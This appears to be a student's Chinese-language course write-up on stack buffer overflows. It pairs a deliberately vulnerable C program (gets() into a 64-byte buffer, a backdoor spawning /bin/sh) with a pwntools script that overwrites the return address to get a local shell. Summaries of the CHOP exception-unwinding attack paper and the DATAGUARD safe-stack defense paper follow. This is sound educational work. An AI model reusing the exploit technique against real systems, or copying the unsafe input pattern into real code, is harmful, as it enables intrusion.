<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="网络攻击检测课程作业"><title>栈溢出攻击</title>
<link rel=canonical href=https://i-corner.github.io/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/><link rel=stylesheet href=/scss/style.min.b648289d40515776fb5acda7a87c981e95e1a7882e8c41bd0a18d680c0123863.css><meta property='og:title' content="栈溢出攻击"><meta property='og:description' content="网络攻击检测课程作业"><meta property='og:url' content='https://i-corner.github.io/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/'><meta property='og:site_name' content='iC0rner'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:published_time' content='2025-04-18T14:14:02+08:00'><meta property='article:modified_time' content='2025-04-18T14:14:02+08:00'><meta property='og:image' content='https://i-corner.github.io/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-7.png'><meta name=twitter:title content="栈溢出攻击"><meta name=twitter:description content="网络攻击检测课程作业"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://i-corner.github.io/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-7.png'><link rel="shortcut icon" href=/favicon.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src="https://avatars.githubusercontent.com/u/80880063?v=4" width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>iC0rner</a></h1><h2 class=site-description>这个人很懒</h2></div></header><ol class=menu-social><li><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>主页</span></a></li><li><a href=/%E5%85%B3%E4%BA%8E/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>关于</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=i18n-switch><svg class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg>
<select name=language title=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://i-corner.github.io/en/>English</option><option value=https://i-corner.github.io/ selected>中文</option><option value=https://i-corner.github.io/ar/>عربي</option></select></li><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#1栈溢出攻击实践>1.栈溢出攻击实践</a><ol><li><a href=#11-实验环境>1.1 实验环境</a></li><li><a href=#12-实验步骤>1.2 实验步骤</a><ol><li><a href=#121-编写漏洞程序>1.2.1 编写漏洞程序</a></li><li><a href=#122-编译漏洞程序>1.2.2 编译漏洞程序</a></li><li><a href=#122-ida分析漏洞程序>1.2.2 IDA分析漏洞程序</a></li><li><a href=#123-编写攻击程序>1.2.3 编写攻击程序</a></li><li><a href=#124-攻击>1.2.4 攻击</a></li></ol></li></ol></li><li><a href=#2栈溢出攻击与防御的文献阅读>2.栈溢出攻击与防御的文献阅读</a><ol><li><a href=#21-攻击类文献ppt中汇报的>2.1 攻击类文献（PPT中汇报的）</a><ol><li><a href=#let-me-unwind-that-for-you-exceptions-to-backward-edge-protection让我为你解开后沿保护的例外>Let Me Unwind That For You: Exceptions to Backward-Edge Protection（让我为你解开：后沿保护的例外）</a></li></ol></li><li><a href=#22-防御类文献>2.2 防御类文献</a><ol><li><a href=#the-taming-of-the-stack-isolating-stack-data-from-memory-errors堆栈驯服将堆栈数据与内存错误隔离>The Taming of the Stack: Isolating Stack Data from Memory Errors堆栈驯服：将堆栈数据与内存错误隔离</a></li><li><a href=#221-问题背景>2.2.1 问题背景</a></li><li><a href=#222-动机>2.2.2 动机</a></li><li><a href=#223-论文方案设计>2.2.3 论文方案设计</a></li><li><a href=#224-实验评估>2.2.4 实验评估</a></li><li><a href=#225-总结和展望>2.2.5 总结和展望</a></li></ol></li></ol></li><li><a href=#3-个人心得体会>3. 个人心得体会</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/><img src=/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-7_hu_e925abb2779f47f4.png srcset="/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-7_hu_e925abb2779f47f4.png 800w, /p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-7_hu_eb1c360471d8ead9.png 1600w" width=800 height=278 loading=lazy alt="Featured image of post 栈溢出攻击"></a></div><div class=article-details><header class=article-category><a href=/categories/pwn/>PWN
</a><a href=/categories/%E8%AF%BE%E7%A8%8B/>课程</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/>栈溢出攻击</a></h2><h3 class=article-subtitle>网络攻击检测课程作业</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Apr 18, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>阅读时长: 10 分钟</time></div></footer></div></header><section class=article-content><h2 id=1栈溢出攻击实践>1.栈溢出攻击实践</h2><h3 id=11-实验环境>1.1 实验环境</h3><ul><li>操作系统：虚拟机 Ubuntu 16.04 LTS</li><li>编译器：gcc 9.3.0</li><li>攻击工具：python 3.8 | pwntools | IDA Pro 8.5</li></ul><h3 id=12-实验步骤>1.2 实验步骤</h3><h4 id=121-编写漏洞程序>1.2.1 编写漏洞程序</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>backdoor</span><span class=p>()</span> <span class=p>{</span>    <span class=c1>// 自定义的函数
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span> <span class=c1>// 后门函数执行shell
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;网络攻击检测作业3_梁铭杰&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span> <span class=c1>// 一个缓冲区
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>gets</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span>    <span class=c1>// 不安全的输入函数导致栈溢出
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>gets</code>函数为不安全的输入函数，当输入的字符数超过缓冲区大小时，会发生栈溢出。</p><p>而<code>backdoor</code>函数为后门函数，当程序执行到该函数时，会执行<code>system("/bin/sh")</code>，即执行<code>/bin/sh</code>命令，从而获得shell。</p><p>按照程序正常执行流程，并不会执行<code>backdoor</code>函数，接下来将进行漏洞利用。</p><h4 id=122-编译漏洞程序>1.2.2 编译漏洞程序</h4><p><strong>为尽可能保证仅仅关注栈溢出攻击以及作业要求（使用栈溢出跳转到自定义函数）
在编译时关闭Canary金丝雀和ASLR地址随机化</strong>
<code>gcc vuln.c -fno-stack-protector -no-pie -o vuln</code></p><h4 id=122-ida分析漏洞程序>1.2.2 IDA分析漏洞程序</h4><p>将程序移进IDA进行反编译分析
<img src=/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-7.png width=1130 height=393 srcset="/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-7_hu_623c6126ff3b111d.png 480w, /p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-7_hu_3c2cd1a410b2b06a.png 1024w" loading=lazy alt="alt text" class=gallery-image data-flex-grow=287 data-flex-basis=690px>
IDA给出所有函数的地址以及反编译内容
再进入main函数的v4变量，即源代码中buffer变量缓冲区
<img src=/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-1.png width=716 height=202 srcset="/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-1_hu_fb45d5e83be86252.png 480w, /p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-1_hu_b243427dcfa45e3e.png 1024w" loading=lazy alt="alt text" class=gallery-image data-flex-grow=354 data-flex-basis=850px>
可见需要输入0x40(buffer变量设定长度)+0x8(栈帧rbp)=0x48才能到达返回地址
<strong>关注重点</strong></p><ol><li>backdoor函数地址为<code>0x0000000004005B6</code></li><li>覆盖长度0x48,而往后的0x8用来覆盖地址</li></ol><p><strong>攻击思路</strong></p><ol><li>在v4变量中输入0x48个字符后，再输入0x8个字节即可覆盖返回地址</li><li>将返回地址设置为backdoor函数地址，达成利用</li></ol><h4 id=123-编写攻击程序>1.2.3 编写攻击程序</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>                              <span class=c1># 导入pwntools</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;debug&#39;</span><span class=p>,</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>)</span>        <span class=c1># 日志环境</span>
</span></span><span class=line><span class=cl><span class=n>backdoor</span> <span class=o>=</span> <span class=mh>0x0000000004005B6</span>                    
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>process</span><span class=p>(</span><span class=s2>&#34;./vuln&#34;</span><span class=p>)</span>                            <span class=c1># 进程</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                              <span class=c1># 接收输入</span>
</span></span><span class=line><span class=cl><span class=n>pl</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x48</span>                                 <span class=c1># 输入0x48个字符</span>
</span></span><span class=line><span class=cl><span class=n>pl</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>backdoor</span><span class=p>)</span>                            <span class=c1># 覆盖返回地址</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pl</span><span class=p>)</span>                                 <span class=c1># 发送</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>                                <span class=c1># 回归用户与进程的交互</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=124-攻击>1.2.4 攻击</h4><h5 id=1241-攻击效果>1.2.4.1 攻击效果</h5><p><img src=/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-3.png width=727 height=407 srcset="/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-3_hu_82db4c8a9e54b420.png 480w, /p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-3_hu_1418baee1f1689ca.png 1024w" loading=lazy alt="alt text" class=gallery-image data-flex-grow=178 data-flex-basis=428px>
在脚本与程序交互后，程序成功执行<code>backdoor</code>函数，获得shell
回归用户与进程的交互后，输入whoami，可以显示当前用户名，与直接使用终端的用户相同
攻击利用达成</p><h5 id=1242-攻击过程>1.2.4.2 攻击过程</h5><p>此处交由GDB调试来具体展示过程
由于需要完成栈溢出攻击并跳转到自定义函数，因此是需要控制程序执行流
在此处只能够在main函数结束时完成攻击
<img src=/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-6.png width=757 height=316 srcset="/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-6_hu_50fb2e5f1a38a459.png 480w, /p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-6_hu_a3765152cd08a378.png 1024w" loading=lazy alt="alt text" class=gallery-image data-flex-grow=239 data-flex-basis=574px>
因此在main函数的retn返回处下断点
<strong>正常程序</strong>
<img src=/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-5.png width=889 height=226 srcset="/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-5_hu_464f0e34791f450f.png 480w, /p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-5_hu_54c24001109addc4.png 1024w" loading=lazy alt="alt text" class=gallery-image data-flex-grow=393 data-flex-basis=944px>
正常程序下，程序执行到retn处，返回到调用main函数的地址(__libc_start_main+176)，即程序结束</p><p><strong>攻击程序</strong>
<img src=/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-4.png width=730 height=320 srcset="/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-4_hu_a3aa0a01c7e22554.png 480w, /p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-4_hu_a3dba4de86747af5.png 1024w" loading=lazy alt="alt text" class=gallery-image data-flex-grow=228 data-flex-basis=547px>
攻击程序下，程序执行到retn处，返回到backdoor函数，获取shell后，该程序运行结束</p><h2 id=2栈溢出攻击与防御的文献阅读>2.栈溢出攻击与防御的文献阅读</h2><h3 id=21-攻击类文献ppt中汇报的>2.1 攻击类文献（PPT中汇报的）</h3><h4 id=let-me-unwind-that-for-you-exceptions-to-backward-edge-protection让我为你解开后沿保护的例外>Let Me Unwind That For You: Exceptions to Backward-Edge Protection（让我为你解开：后沿保护的例外）</h4><h5 id=211-问题背景>2.1.1 问题背景</h5><p>传统的堆栈缓冲区溢出攻击（尤其是利用返回地址篡改实现的后向控制流劫持）长期以来一直是软件攻击的一个关键点。为了防范这类攻击，学术界和工业界提出了多种后向保护机制，例如栈保护(canaries)和影子栈(shadow stacks)。这些防护措施的基本假设是：攻击者必须直接篡改返回地址才能劫持控制流，从而可以通过检测返回时的数据完整性来防御攻击。</p><h5 id=212-动机>2.1.2 动机</h5><p><img src=/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-8.png width=448 height=111 srcset="/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-8_hu_1c237bab215f1ed1.png 480w, /p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-8_hu_1f6dc268fd102de3.png 1024w" loading=lazy alt=传统防御方案的不足 class=gallery-image data-flex-grow=403 data-flex-basis=968px></p><p>论文作者注意到，尽管这些防护机制在传统场景下非常有效，但它们普遍依赖一个关键假设：即攻击者必须通过直接控制返回地址来实现攻击。然而，论文指出，攻击者并不一定需要直接劫持返回地址，而可以利用异常处理机制在堆栈展开过程中实现控制流劫持。这种方法绕过了传统后向保护机制，从而开启了一种新的攻击范式。</p><h5 id=213-论文方案设计>2.1.3 论文方案设计</h5><p>论文提出了一种名为 Catch Handler Oriented Programming (CHOP) 的新型攻击技术，其核心思想在于利用常规后向保护机制未覆盖的异常处理进行堆栈展开，进而可进行传统的ROP攻击。
当程序触发异常时，运行时系统会走异常处理的流程（即“堆栈展开”），其过程中会依据堆栈上的元数据找到合适的异常处理程序（catch handler）或清理代码(cleanup handler)。如果攻击者能够利用堆栈溢出漏洞破坏堆栈数据，那么在异常处理过程中，运行时系统会按照攻击者构造的数据进行堆栈展开，进而“误导”异常处理逻辑跳转到攻击者控制的处理程序。
论文提出的 CHOP 攻击正是基于此原理展开，其核心在于定义并利用“混淆原语”（Confusion Primitives），即通过破坏特定堆栈数据结构，让异常展开逻辑误将攻击者构造的数据当作合法跳转目标或状态恢复信息。通过这种方式，攻击者可在异常处理过程中构造出多个具备关键功能的“gadget”，类似于传统 ROP（Return-Oriented Programming）攻击中所用的代码片段。作者通过对大量文件进行分析，发现这些 gadget 在现实世界中非常普遍，尤其是在使用 C++ 异常机制的程序中，异常处理器常常含有内存读写、控制流转移等指令，极易被利用构建攻击链。</p><h5 id=214-实验>2.1.4 实验：</h5><p>文章对多个平台（包括 Linux、macOS、Windows、Android 和 iOS）进行了跨体系结构的测试，基于 Debian Buster 发行版中的上千个流行程序包展开大规模分析。实验表明，约 10% 的程序包含可被利用的异常处理逻辑，并在其中识别出了数量庞大的潜在 CHOP gadget。另外，作者还用CVE-2009-4009和SCSSU-201801来举例通过CHOP构造的攻击样本可以在实际系统中实现任意内存写、控制流劫持及数据泄漏等复杂攻击。</p><h5 id=215-防御措施与改进建议>2.1.5 防御措施与改进建议：</h5><p>在短期缓解上，论文建议在堆栈展开（异常处理）过程中扩展栈 canary 检查，从而在异常抛出时检测堆栈数据是否被修改。可以考虑对异常处理元数据进行完整性校验或者采用与异常处理紧密耦合的安全机制（例如在 shadow stack 实现上修改堆栈展开逻辑，使其依赖于更安全的备份数据）。
而对于较彻底的防御，论文建议在编译器和运行时系统中，对异常处理（包括 try/catch 块内及其清理代码）进行更严格的安全性检查，从根本上防止攻击者利用异常处理流程进行控制流劫持，或是采用先进的防护策略（如函数随机化、细粒度随机化）来降低攻击者预测异常处理代码地址的能力。</p><h5 id=216-总结和展望>2.1.6 总结和展望：</h5><p>全文通过对传统后向保护机制局限性的深刻分析，展示了攻击者如何利用异常处理中的堆栈展开流程来实现控制流劫持，即 CHOP 攻击。此方法绕过了目前广泛采用的防护措施（如金丝雀和影子栈），而且在多个平台上均能成功实施，具有很强的现实威胁。未来的研究可能会进一步探讨更加完善的异常处理安全机制，以及如何在不影响性能的前提下集成更多安全检查，以防止类似 CHOP 这样的新型攻击方式。</p><h3 id=22-防御类文献>2.2 防御类文献</h3><h4 id=the-taming-of-the-stack-isolating-stack-data-from-memory-errors堆栈驯服将堆栈数据与内存错误隔离>The Taming of the Stack: Isolating Stack Data from Memory Errors堆栈驯服：将堆栈数据与内存错误隔离</h4><h4 id=221-问题背景>2.2.1 问题背景</h4><p>传统的堆栈防护（例如使用金丝雀、影子栈以及安全栈机制）主要关注于防止对代码指针的修改，从而阻断传统的缓冲区溢出攻击，即侧重于保护返回地址等关键代码指针。然而，随着攻击技术的演进，攻击者不仅针对返回地址，还可能利用空间错误（buffer overflow/underflow）、类型错误（type confusion）和时间错误（temporal errors，如使用未初始化或已释放的指针）来修改堆栈中其他敏感数据或窃取信息。这些额外的内存错误如果得不到防护，仍然会给系统带来风险。</p><h4 id=222-动机>2.2.2 动机</h4><p>现有的安全机制在设计上过于保守，将大量对象归类为“不安全”，从而不得不牺牲较多不必要的操作以对这些对象进行保护；同时，部分防御仅仅能保护返回地址，而无法全面防护堆栈上的所有数据对象。论文的目标在于如何能够更精确地验证哪些堆栈对象真正安全，从而将这些对象隔离到“安全堆栈”中，以阻断各种内存错误的利用，同时降低运行时开销。</p><h4 id=223-论文方案设计>2.2.3 论文方案设计</h4><p><img src=/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-9.png width=554 height=110 srcset="/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-9_hu_41b88fb05db0083f.png 480w, /p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-9_hu_2ad3940b439b63e6.png 1024w" loading=lazy alt=防御方案 class=gallery-image data-flex-grow=503 data-flex-basis=1208px></p><p>论文提出了DATAGUARD系统，作为一种新的堆栈防护方案，其核心思路是通过静态分析和约束符号执行相结合的方法，对每个堆栈对象进行安全性验证。
论文在安全性定义方面做出了扩展，不再局限于仅保护代码指针，而是要求所有被保护的堆栈对象必须在所有可能的执行路径上满足严格的安全约束。具体来说，一个堆栈对象要被认定为安全，必须确保所有可能引用该对象的指针在空间上访问都严格位于该对象的边界内，在类型转换上不会发生数值或语义上的改变，并且在使用时始终处于合法的生命周期之内。为此，作者设计了一套验证机制，既包括静态分析，也引入了符号执行技术。通过静态分析，系统可以初步对堆栈对象的定义、引用和使用情况进行推导，生成与空间、类型和时间安全相关的约束；而针对那些因过于保守而不能直接证明安全的对象，则借助符号执行进一步验证其在所有可能路径上是否满足安全条件，防止静态阶段错误的安全分类。
DATAGUARD利用LLVM平台上的中间表示（SSA形式）结合现有的程序依赖图（PDG）和SVF工具进行指针别名和活跃区间分析，并通过S2E框架对部分难以断定的情况采用有针对性的符号执行。只有那些在所有可能情况中均无安全隐患的堆栈对象，才能被归入安全类别，并最终移入与常规堆栈隔离的安全堆栈中，以完全依赖编译期生成的运行时保护机制提供高效的安全防护。</p><h4 id=224-实验评估>2.2.4 实验评估</h4><p>论文在多个服务器程序（如nginx、httpd、openvpn等）以及SPEC CPU2006基准测试上进行了评估。结果显示，DATAGUARD能够将更多原本被传统Safe Stack方法判定为不安全的堆栈对象判定为安全，从而在扩展堆栈保护范围的同时，还能降低运行时防护的性能开销。例如，在SPEC CPU006基准测试中，通过DATAGUARD方式保护堆栈对象所增加的性能开销平均由11.3%降低到4.3%。</p><h4 id=225-总结和展望>2.2.5 总结和展望</h4><p>论文基于隔离栈的技术，参考OSDI'14上的一篇工作《Code-pointer integrity》，在保证代码指针的完整性基础上，通过建立更严格的安全定义，将堆栈对象的保护范围从单一的返回地址扩展到所有堆栈数据。另外通过静态分析与符号执行相结合的验证方法，确保只有在所有可能的执行情形下均满足严格安全约束的对象才被归入安全堆栈，从而在不牺牲安全性的前提下显著降低运行时检测的开销。该工作为内存错误防护提供了新的视角，不仅提高了堆栈数据的保护力度，而且为相关防御措施的改进指明了方向。</p><h2 id=3-个人心得体会>3. 个人心得体会</h2><p>在准备此次作业的过程中，从实际操作和文献上了解到了栈溢出攻击和防御。在文献的阅读上，检索到了较多的相关文献，除了上述两篇以外，还涉及到许多顶会的论文文献（PPT中讲述），切身感受到当前研究趋势的多样化与日益精细化。
